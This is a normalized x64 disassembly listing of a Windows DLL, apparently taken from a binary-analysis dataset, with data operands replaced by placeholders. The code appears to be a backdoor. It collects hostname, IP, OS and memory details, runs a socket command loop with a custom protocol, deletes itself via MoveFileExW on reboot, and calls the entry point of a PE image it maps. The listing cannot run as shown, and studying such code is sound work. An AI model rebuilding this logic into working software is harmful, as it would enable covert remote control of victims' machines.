sub_180006784
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x390
mov rbx rcx
mov [ rw-data ] rcx
lea rsi [ rw-data ]
lea rdx [ r--data ]
mov rcx rsi
call sub_18000c6c4
lea rcx [ rw-data ]
mov edx 0x104
call [ GetSystemDirectoryW@IAT ]
mov edi 0x208
lea rdx [ rw-data ]
mov r8d edi
mov rcx rbx
call [ GetModuleFileNameW@IAT ]
lea rdx [ rw-data ]
mov r8d edi
xor ecx ecx
call [ GetModuleFileNameW@IAT ]
xor edi edi
lea rcx [ rsp + 0x182 ]
xor edx edx
mov r8d 0x206
mov [ rsp + 0x180 ] di
call sub_180016870
lea rcx [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
call sub_18000dffc
lea r8 [ rsp + 0x180 ]
cmp rax rdi
jne r-xdata
lea rcx [ rax + 0x2 ]
mov rdx rcx
sub r8 rcx
lea rbx [ rw-data ]
xor r9d r9d
mov edx 0x104
mov rcx rbx
call sub_18000c71c
lea r8 [ rw-data ]
lea rdx [ r--data ]
mov rcx rsi
call sub_18000c710
lea r8 [ rw-data ]
lea rdx [ r--data ]
call sub_18000c710
lea rcx [ rsp + 0x180 ]
xor r9d r9d
mov r8 rbx
mov edx 0x104
call sub_18000c7d4
lea rdx [ r--data ]
mov rcx rsi
mov r8 rax
call sub_18000c710
lea r8 [ rw-data ]
lea rdx [ r--data ]
call sub_18000c710
lea r8 [ rw-data ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r9 rbx
call sub_18000630c
lea r8 [ rw-data ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r9 rbx
call sub_18000630c
mov ebx 0x11c
lea rcx [ rsp + 0x60 ]
mov r8 rbx
xor edx edx
call sub_180016870
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x60 ] ebx
call [ GetVersionExW@IAT ]
cmp eax edi
je r-xdata
movzx eax [ rdx ]
mov [ r8 + rdx ] ax
add rdx 0x2
cmp ax di
jne r-xdata
lea r11 [ rsp + 0x390 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov eax [ rsp + 0x64 ]
xor edx edx
lea rcx [ rsp + 0x30 ]
mov [ rw-data ] eax
mov eax [ rsp + 0x68 ]
lea r8d [ rdx + 0x30 ]
mov [ rw-data ] eax
call sub_180016870
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ rsp + 0x30 ]
cmp rax rdi
je r-xdata
call [ GetSystemInfo@IAT ]
call rax
jmp r-xdata
movzx eax [ rsp + 0x30 ]
mov r9d [ rw-data ]
mov r8d [ rw-data ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] ax
mov [ rsp + 0x20 ] eax
call sub_18000c710
sub_1800069c8
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov eax 0x1ea0
call sub_1800232c0
sub rsp rax
mov r13 rcx
lea rcx [ rsp + 0xea2 ]
xor r15d r15d
xor edx edx
mov r8d 0x7fe
mov [ rsp + 0xea0 ] r15w
call sub_180016870
lea rcx [ rsp + 0xaa1 ]
xor edx edx
mov r8d 0x3ff
mov [ rsp + 0xaa0 ] r15b
call sub_180016870
mov ebx 0x800
lea rcx [ rsp + 0x16a0 ]
mov r8 rbx
xor edx edx
call sub_180016870
lea rcx [ rsp + 0x90 ]
mov r8 rbx
xor edx edx
call sub_180016870
mov edi 0x400
lea rcx [ rsp + 0xaa0 ]
mov edx edi
call [ gethostname@IAT ]
cmp eax r15d
je r-xdata
lea r8 [ rsp + 0xaa0 ]
lea rcx [ rsp + 0xea0 ]
xor r9d r9d
mov rdx rdi
call sub_18000c7d4
lea rdx [ rsp + 0x90 ]
mov r14d 0x2
xor eax eax
jmp r-xdata
movzx ecx [ rax ]
add rax r14
mov [ rdx ] cx
add rdx r14
cmp cx r15w
jne r-xdata
lea r8 [ rsp + 0x90 ]
lea rcx [ rsp + 0xaa0 ]
xor r9d r9d
mov rdx rdi
call sub_18000c71c
mov rcx rax
call [ gethostbyname@IAT ]
mov r12 rax
cmp rax r15
je r-xdata
mov rbx [ rsp + 0x1ee0 ]
add rsp 0x1ea0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rbp 0xffffffff80000002
lea r9 [ rsp + 0x16a0 ]
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rbp
mov [ rsp + 0x20 ] ebx
call sub_180008268
xor eax eax
or rsi 0xffffffffffffffff
lea rdi [ rsp + 0x90 ]
mov rcx rsi
lea r8 [ rsp + 0x16a0 ]
[ rdi ]
mov eax [ r--data ]
mov rcx rsi
sub rdi r14
mov [ rdi ] eax
xor eax eax
lea rdi [ rsp + 0x90 ]
[ rdi ]
sub rdi r14
xor ecx ecx
movzx eax [ r8 + rcx ]
mov [ rdi + rcx ] ax
add rcx r14
test ax ax
jne r-xdata
xor eax eax
lea rdi [ rsp + 0x90 ]
mov rcx rsi
[ rdi ]
mov eax [ r--data ]
lea r9 [ rsp + 0x16a0 ]
sub rdi r14
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rbp
mov [ rsp + 0x20 ] ebx
mov [ rdi ] eax
call sub_180008268
xor eax eax
lea rdi [ rsp + 0x90 ]
mov rcx rsi
lea rdx [ rsp + 0x16a0 ]
[ rdi ]
sub rdi r14
xor ecx ecx
movzx eax [ rdx + rcx ]
mov [ rdi + rcx ] ax
add rcx r14
test ax ax
jne r-xdata
mov [ rsp + 0x1ef8 ] r15d
call [ GetCurrentProcessId@IAT ]
lea rdx [ rsp + 0x1ef8 ]
mov ecx eax
call [ ProcessIdToSessionId@IAT ]
lea rcx [ rsp + 0x892 ]
xor edx edx
mov r8d 0x206
mov [ rsp + 0x890 ] r15w
call sub_180016870
mov r8d [ rsp + 0x1ef8 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x890 ]
call sub_18000630c
mov edx [ r--data ]
xor eax eax
lea rdi [ rsp + 0x90 ]
mov rcx rsi
lea r8 [ rsp + 0x890 ]
[ rdi ]
mov rcx rsi
sub rdi r14
mov [ rdi ] edx
lea rdi [ rsp + 0x90 ]
[ rdi ]
sub rdi r14
xor ecx ecx
movzx eax [ r8 + rcx ]
mov [ rdi + rcx ] ax
add rcx r14
test ax ax
jne r-xdata
xor eax eax
lea r8 [ rw-data ]
mov rcx rsi
mov rdi r8
[ rdi ]
lea rdi [ rsp + 0x90 ]
not rcx
cmp rcx 0x1
mov rcx rsi
je r-xdata
[ rdi ]
mov rcx rsi
lea r8 [ rw-data ]
sub rdi r14
mov [ rdi ] edx
lea rdi [ rsp + 0x90 ]
[ rdi ]
sub rdi r14
xor ecx ecx
[ rdi ]
mov rcx rsi
sub rdi r14
mov [ rdi ] edx
lea rdi [ rsp + 0x90 ]
[ rdi ]
sub rdi r14
xor ecx ecx
movzx eax [ r8 + rcx ]
mov [ rdi + rcx ] ax
add rcx r14
test ax ax
jne r-xdata
mov rbx r15
movzx eax [ r8 + rcx ]
mov [ rdi + rcx ] ax
add rcx r14
test ax ax
jne r-xdata
jmp r-xdata
lea rcx [ rsp + 0x16a0 ]
call sub_18000a734
lea r9 [ rsp + 0x16a0 ]
lea r8 [ rsp + 0x90 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000630c
lea rdx [ r--data ]
movsxd rdi eax
lea rcx [ r13 + rdi * 2 ]
call sub_18000630c
lea rdx [ r--data ]
lea rcx [ rsp + 0xea0 ]
xor r8d r8d
mov [ rsp + 0x1ef0 ] r15d
add edi eax
call sub_18000630c
mov ebx 0x1
mov rbp 0xffffffff80000002
lea esi [ rbx + 0x3 ]
jmp r-xdata
xor eax eax
mov rcx rsi
lea rdi [ rsp + 0x90 ]
[ rdi ]
mov ebp r15d
mov rsi r15
sub rdi r14
mov [ rdi ] edx
cmp r15w [ r12 + 0x12 ]
jge r-xdata
lea r9 [ rsp + 0x1ef0 ]
lea r8 [ r--data ]
lea rdx [ rsp + 0xea0 ]
mov rcx rbp
mov [ rsp + 0x20 ] esi
call sub_180008268
cmp eax r15d
jne r-xdata
add rbx 0x8
or rsi 0xffffffffffffffff
jmp r-xdata
cmp rsi r15
jle r-xdata
mov r8d [ rsp + 0x1ef0 ]
movsxd rax edi
lea rdx [ r--data ]
lea rcx [ r13 + rax * 2 ]
call sub_18000630c
lea rdx [ r--data ]
lea rcx [ rsp + 0xea0 ]
mov r8d ebx
add edi eax
call sub_18000630c
inc ebx
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x50 ] 0x38
call [ GlobalMemoryStatus@IAT ]
mov r8 [ rsp + 0x58 ]
movsxd rax edi
lea rcx [ r13 + rax * 2 ]
lea rdx [ r--data ]
shr r8 0x14
call sub_18000630c
lea rdx [ r--data ]
add edi eax
movsxd rcx edi
lea rcx [ r13 + rcx * 2 ]
call sub_18000630c
lea r8 [ rw-data ]
lea rdx [ r--data ]
add edi eax
movsxd rcx edi
lea rcx [ r13 + rcx * 2 ]
call sub_18000630c
mov eax 0x1
mov rax [ r12 + 0x18 ]
cmp [ rbx + rax ] r15
je r-xdata
mov rax [ r12 + 0x18 ]
lea rdx [ r--data ]
mov rcx [ rbx + rax ]
movzx r8d [ rcx + rsi ]
lea rcx [ rsp + 0x30 ]
call sub_18000d67c
lea r8 [ rsp + 0x30 ]
lea rcx [ rsp + 0xea0 ]
xor r9d r9d
mov edx 0x400
call sub_18000c7d4
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x90 ]
mov r11 rax
xor eax eax
[ rdi ]
sub rdi r14
xor edx edx
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x90 ]
[ rdi ]
mov eax [ r--data ]
sub rdi r14
mov [ rdi ] eax
movzx ecx [ r11 + rdx ]
mov [ rdi + rdx ] cx
add rdx r14
test cx cx
jne r-xdata
movsx eax [ r12 + 0x12 ]
inc ebp
inc rsi
cmp ebp eax
jl r-xdata
mov edx [ r--data ]
sub_180006f14
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov edi ecx
mov ebx esi
lea rdx [ rw-data ]
sub rdx rax
inc ebx
cmp ebx 0x3
jl r-xdata
movzx ecx [ rax ]
mov [ rdx + rax ] cx
add rax 0x2
cmp cx si
jne r-xdata
mov eax 0x1
mov eax 0xaaaaaaab
mov ecx edi
mul edi
shr edx 0x1
lea eax [ rdx + rdx * 2 ]
sub ecx eax
lea rax [ rw-data ]
shl rcx 0x6
add rcx rax
call sub_18000a064
inc edi
cmp rax rsi
jne r-xdata
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180006f90
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x8 ] rcx
push rdi
sub rsp 0xc30
mov rdi r8
mov rbx rdx
lea rcx [ rsp + 0x30 ]
lea r8 [ rw-data ]
xor esi esi
xor r9d r9d
mov edx 0x400
mov [ rax + 0x20 ] 0x1
mov [ rax + 0x8 ] rsi
call sub_18000c71c
mov rcx rax
call [ inet_addr@IAT ]
lea edx [ rsi + 0x1 ]
lea r9 [ rsp + 0xc58 ]
mov [ rsp + 0xc5c ] eax
lea rax [ rsp + 0xc40 ]
xor r8d r8d
mov rcx rbx
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] rax
call DnsQuery_W
cmp eax esi
je r-xdata
mov rax [ rsp + 0xc40 ]
mov ecx [ rax + 0x20 ]
call [ inet_ntoa@IAT ]
cmp rax rsi
je r-xdata
xor al al
jmp r-xdata
mov ebx esi
lea rcx [ rsp + 0x430 ]
xor r9d r9d
mov r8 rax
mov edx 0x400
call sub_18000c7d4
lea r11 [ rsp + 0xc30 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
movzx ecx [ rax ]
add rax 0x2
mov [ rdi ] cx
add rdi 0x2
cmp cx si
jne r-xdata
mov ebx 0x1
jmp r-xdata
mov rcx [ rsp + 0xc40 ]
mov edx 0x1
call DnsFree
cmp ebx esi
setne al
sub_18000708c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0xbe0
lea r8 [ rw-data ]
lea rdx [ r--data ]
lea rbx [ rw-data ]
mov rcx rbx
call sub_18000c710
mov rdx r8
lea rcx [ rw-data ]
call sub_18000ca64
xor r14d r14d
cmp al r14b
jne r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
movzx ecx [ rw-data ]
call sub_18000611c
lea rcx [ rw-data ]
call sub_1800010f8
cmp eax r14d
jne r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
xor eax eax
jmp r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
mov ecx 0x202
lea rdx [ rsp + 0x240 ]
call [ WSAStartup@IAT ]
cmp eax r14d
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
mov eax 0x1
jmp r-xdata
lea r11 [ rsp + 0xbe0 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
mov r13d r14d
mov [ rw-data ] 0x1
cmp [ rw-data ] r14d
jne r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
mov eax 0x1
jmp r-xdata
lea rsi [ rw-data ]
mov r8d 0x63
lea rsi [ rw-data ]
mov rdx rsi
mov edi 0x2619
mov ecx edi
call sub_18000ca08
lea rdx [ rw-data ]
mov ecx edi
call sub_18000ca08
mov [ rw-data ] 0x1
jmp r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
call [ WSACleanup@IAT ]
jmp r-xdata
cmp r12d 0x1
jne r-xdata
mov rcx rsi
call sub_180001038
mov r12d r14d
cmp al r14b
sete r12b
cmp r12d r14d
jne r-xdata
mov ecx r13d
inc r13d
mov [ rsp + 0x20 ] r13d
call sub_180006f14
cmp eax r14d
jne r-xdata
mov rax [ rw-data ]
mov r9d [ rw-data ]
mov r8 rsi
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
movzx edx [ rw-data ]
mov rcx rsi
call sub_180009fa4
mov [ rw-data ] rax
jmp r-xdata
mov r8 rsi
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
lea r8 [ rsp + 0x30 ]
mov rdx rsi
lea rcx [ rw-data ]
call sub_180006f90
cmp al r14b
je r-xdata
mov ecx 0x3e8
call [ Sleep@IAT ]
call [ GetLastError@IAT ]
mov ecx 0x3e8
call [ Sleep@IAT ]
mov r9d [ rw-data ]
mov r8 rsi
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
jmp r-xdata
cmp rax r14
je r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
mov r8 rsi
lea rdx [ r--data ]
call sub_18000c710
mov rcx rsi
call sub_18000a064
mov rdi rax
cmp rax r14
je r-xdata
lea r8 [ rsp + 0x30 ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r14d
je r-xdata
cmp [ rw-data ] r14d
je r-xdata
mov [ rsp + 0x3e0 ] r14w
xor edx edx
mov r8d 0x7fe
lea rcx [ rsp + 0x3e2 ]
call sub_180016870
mov edx 0x400
lea rcx [ rsp + 0x3e0 ]
call sub_1800069c8
cmp eax r14d
jne r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
mov ecx 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rax
call sub_18000d5e8
cmp eax r14d
je r-xdata
movzx edx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_180009fa4
mov [ rw-data ] rax
jmp r-xdata
mov r9b 0x1
xor r8d r8d
mov rdx [ rw-data ]
xor ecx ecx
call sub_180007524
cmp eax r14d
jne r-xdata
mov rcx [ rw-data ]
call sub_180009ec0
mov ecx 0x3e8
call [ Sleep@IAT ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
jmp r-xdata
lea rcx [ rsp + 0x30 ]
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x3e0 ]
[ rdi ]
not rcx
lea r8d [ rcx + rcx - 0x2 ]
lea rdx [ rsp + 0x3e0 ]
mov rcx [ rw-data ]
call sub_18000a1ac
mov dl 0xf4
mov rcx [ rw-data ]
call sub_18000a24c
mov rcx [ rw-data ]
call sub_180007c84
mov ecx [ rw-data ]
call [ Sleep@IAT ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
jmp r-xdata
mov ecx 0x7d0
call [ Sleep@IAT ]
mov rcx [ rw-data ]
call sub_180009ec0
mov ecx 0x7d0
call [ Sleep@IAT ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
jmp r-xdata
movzx eax [ rdi ]
mov [ rcx ] ax
add rdi 0x2
add rcx 0x2
cmp ax r14w
jne r-xdata
lea r8 [ rsp + 0x30 ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18000c710
movzx edx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_180009fa4
mov [ rw-data ] rax
jmp r-xdata
sub_180007524
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x70
mov rbp rcx
mov esi r8d
mov rbx rdx
mov r12d 0x10
lea rcx [ rax - 0x58 ]
xor edx edx
mov r8 r12
mov dil r9b
call sub_180016870
lea rcx [ rsp + 0x30 ]
call sub_180009c38
lea r9d [ r12 - 0x9 ]
lea rdx [ rsp + 0x20 ]
mov r8d r12d
mov rcx rbx
call sub_18000a128
test eax eax
jle r-xdata
xor eax eax
mov eax 0x2619
cmp [ rsp + 0x20 ] eax
jne r-xdata
mov ecx 0x6781
cmp [ rsp + 0x24 ] ecx
jne r-xdata
movss xmm0 [ rsp + 0x28 ]
mov [ rsp + 0x24 ] ecx
lea rdx [ rsp + 0x20 ]
movss [ rsp + 0x3c ] xmm0
movss xmm0 [ rw-data ]
mov r8d r12d
mov rcx rbx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x40 ] dil
movss [ rsp + 0x28 ] xmm0
mov [ rsp + 0x20 ] eax
mov [ rsp + 0x2c ] esi
call sub_18000a1ac
lea r9d [ r12 + 0xe ]
lea rdx [ rsp + 0x20 ]
mov r8d r12d
mov rcx rbx
call sub_18000a128
test eax eax
jle r-xdata
test dil dil
je r-xdata
mov eax [ rsp + 0x24 ]
lea rcx [ rsp + 0x20 ]
mov r8 r12
xor edx edx
mov [ rsp + 0x38 ] eax
call sub_180016870
and [ rsp + 0x20 ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
cmp [ rsp + 0x20 ] eax
je r-xdata
lea rcx [ rw-data ]
mov rdx rbp
call sub_180009e60
mov [ rsp + 0x24 ] eax
lea rcx [ rsp + 0x30 ]
lea rdx [ rsp + 0x50 ]
mov rax [ rcx ]
mov [ rdx ] rax
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
mov rax [ rcx + 0x10 ]
lea rcx [ rw-data ]
mov [ rdx + 0x10 ] rax
lea rdx [ rsp + 0x50 ]
call sub_180009c4c
jmp r-xdata
cmp eax 0x4093df4e
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop r12
retn
lea rdx [ rsp + 0x20 ]
mov r8d r12d
mov rcx rbx
call sub_18000a1ac
mov eax 0x1
jmp r-xdata
lea rcx [ rsp + 0x20 ]
mov r8 r12
xor edx edx
call sub_180016870
lea rdx [ rsp + 0x20 ]
mov r8d r12d
mov rcx rbx
mov [ rsp + 0x20 ] 0x1
call sub_18000a1ac
sub_1800076d8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor r12d r12d
mov esi r8d
mov rbx rdx
cmp r8d r12d
mov rbp rcx
mov edi r12d
jle r-xdata
xor eax eax
or edx 0xffffffff
mov rcx rbp
call sub_18000a0dc
cmp eax 0xffffffff
je r-xdata
cmp eax r12d
je r-xdata
xor r9d r9d
movsxd rdx edi
mov rcx rbp
lea r8d [ r9 + 0x2 ]
add rdx rbx
call [ recv@IAT ]
cmp eax r12d
jle r-xdata
add edi eax
mov eax edi
cdq
sub eax edx
sar eax 0x1
movsxd rcx eax
mov [ rbx + rcx * 2 ] r12w
cmp edi 0x2
jne r-xdata
cmp edi 0x4
jl r-xdata
cmp [ rbx ] 0xa
je r-xdata
cmp edi esi
jl r-xdata
mov eax edi
cdq
sub eax edx
sar eax 0x1
movsxd rcx eax
cmp [ rbx + rcx * 2 - 0x2 ] 0xa
je r-xdata
mov [ rbx ] r12w
mov eax edi
cdq
sub eax edx
sar eax 0x1
movsxd rcx eax
mov [ rbx + rcx * 2 - 0x2 ] r12w
cmp [ rbx + rcx * 2 - 0x4 ] 0xd
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov eax 0x1
jmp r-xdata
mov [ rbx + rcx * 2 - 0x4 ] r12w
jmp r-xdata
sub_1800077e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov ebx edx
mov rsi rcx
call sub_180007bd4
mov rdi rax
test rax rax
jne r-xdata
mov edx 0x7530
mov r8d 0x1388
mov rcx rax
call sub_18000a2e8
cmp ebx 0x1
jne r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_18000a28c
xor eax eax
jmp r-xdata
cmp ebx 0x6
jne r-xdata
lea rcx [ sub_18000330c ]
mov rdx rdi
call sub_180001000
lea rdx [ r--data ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp ebx 0x4
jne r-xdata
lea rcx [ sub_180008470 ]
mov rdx rdi
call sub_180001000
lea rdx [ r--data ]
jmp r-xdata
lea rcx [ rw-data ]
call sub_18000c710
mov eax 0x1
lea rcx [ sub_18000be58 ]
mov rdx rdi
call sub_180001000
lea rdx [ r--data ]
sub_1800078a0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x450
mov r8 rdx
mov rbx rdx
mov rdi rcx
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov esi 0x1
call sub_18000c710
lea rcx [ rsp + 0x32 ]
xor r12d r12d
xor edx edx
mov r8d 0x206
mov [ rsp + 0x30 ] r12w
call sub_180016870
lea r8 [ rsp + 0x30 ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18000dd60
lea rdx [ rsp + 0x470 ]
mov rcx rbx
mov [ rsp + 0x470 ] r12d
call [ CommandLineToArgvW@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x20 ] edi
mov [ rsp + 0x28 ] rbx
mov rbp rax
call sub_18000d5e8
cmp eax r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
je r-xdata
lea r8 [ rw-data ]
lea rdx [ r--data ]
mov rcx rdi
call sub_18000a28c
jmp r-xdata
mov rcx rdi
call sub_1800077b4
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
je r-xdata
lea r11 [ rsp + 0x450 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
mov rcx rdi
call sub_18000a7b0
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
lea rcx [ rsp + 0x20 ]
call sub_180006670
jmp r-xdata
lea r8 [ rw-data ]
lea rdx [ r--data ]
mov rcx rdi
call sub_18000a28c
mov eax esi
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
mov edx esi
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
mov edx 0x6
jmp r-xdata
mov rcx rdi
call sub_1800077e0
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
mov edx 0x4
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
mov esi r12d
mov [ rw-data ] r12d
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_18000d5e8
cmp eax r12d
jne r-xdata
mov rcx [ rbp + 0x8 ]
call sub_18000d410
mov edx 0x2710
lea rcx [ rw-data ]
imul eax eax 0x3e8
cmp eax r12d
cmovle eax edx
lea rdx [ r--data ]
mov r8d eax
mov [ rw-data ] eax
call sub_18000c710
xor eax eax
jmp r-xdata
lea r8 [ rsp + 0x30 ]
lea rdx [ r--data ]
mov rcx rdi
call sub_18000a28c
jmp r-xdata
lea rcx [ rw-data ]
call sub_180001088
cmp al r12b
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov esi r12d
mov [ rw-data ] r12d
call sub_18000c710
jmp r-xdata
lea rcx [ rsp + 0x242 ]
xor edx edx
mov r8d 0x206
mov [ rsp + 0x240 ] r12w
call sub_180016870
call [ GetTickCount@IAT ]
lea r8 [ rw-data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x240 ]
mov r9d eax
call [ wsprintfW@IAT ]
lea r8 [ rsp + 0x240 ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
lea rdx [ rsp + 0x240 ]
lea rcx [ rw-data ]
call [ MoveFileW@IAT ]
xor edx edx
lea rcx [ rsp + 0x240 ]
lea r8d [ rdx + 0x4 ]
call [ MoveFileExW@IAT ]
sub_180007bd4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
push rdi
sub rsp 0x50
mov esi edx
lea r8 [ rax + 0x18 ]
lea rdx [ rax - 0x38 ]
mov rbx rcx
mov [ rax + 0x18 ] 0x10
call [ getpeername@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ rsp + 0x24 ]
call [ inet_ntoa@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
mov r8 rax
call sub_18000d67c
movzx ecx [ rsp + 0x22 ]
call [ ntohs@IAT ]
lea rcx [ rsp + 0x30 ]
movzx edx ax
call sub_18000a010
mov rdi rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
lea rcx [ rw-data ]
mov rdx rbx
call sub_180009e00
test rax rax
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov r9b [ rax + 0x10 ]
mov r8d esi
mov rdx rdi
mov rcx rbx
call sub_180007524
neg eax
sbb rax rax
and rax rdi
sub_180007c84
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0xb80
mov rbx [ rw-data ]
lea rcx [ rsp + 0x20 ]
mov edx 0x104
call [ gethostname@IAT ]
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x380 ]
xor r9d r9d
mov edx 0x400
call sub_18000c7d4
lea r8 [ rw-data ]
xor edi edi
mov rdx r8
movzx ecx [ rax ]
add rax 0x2
mov [ rdx ] cx
add rdx 0x2
cmp cx di
jne r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000a28c
mov ecx 0x1
call [ SetErrorMode@IAT ]
mov edx 0x7530
mov r8d 0x1b58
mov rcx rbx
call sub_18000a2e8
jmp r-xdata
lea rdx [ rsp + 0x130 ]
or r9d 0xffffffff
mov r8d 0x250
mov rcx rbx
call sub_1800076d8
cmp eax edi
jne r-xdata
lea rdx [ rsp + 0x130 ]
mov rcx rbx
call sub_1800078a0
cmp eax edi
je r-xdata
lea rcx [ rw-data ]
mov rdx rbx
call sub_180009d48
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
mov edx 0x2
mov rcx rbx
call [ shutdown@IAT ]
mov rcx rbx
call sub_180009ec0
mov rbx [ rsp + 0xb90 ]
mov eax 0x1
add rsp 0xb80
pop rdi
retn
sub_180007db0
sub rsp 0x28
mov rax [ rcx ]
call [ rax + 0x18 ]
test rax rax
je r-xdata
add rsp 0x28
retn
mov ecx [ rax + 0x3c ]
xor r8d r8d
add ecx eax
lea edx [ r8 + 0x1 ]
mov r9d [ rcx + 0x28 ]
mov rcx rax
add r9d eax
call r9
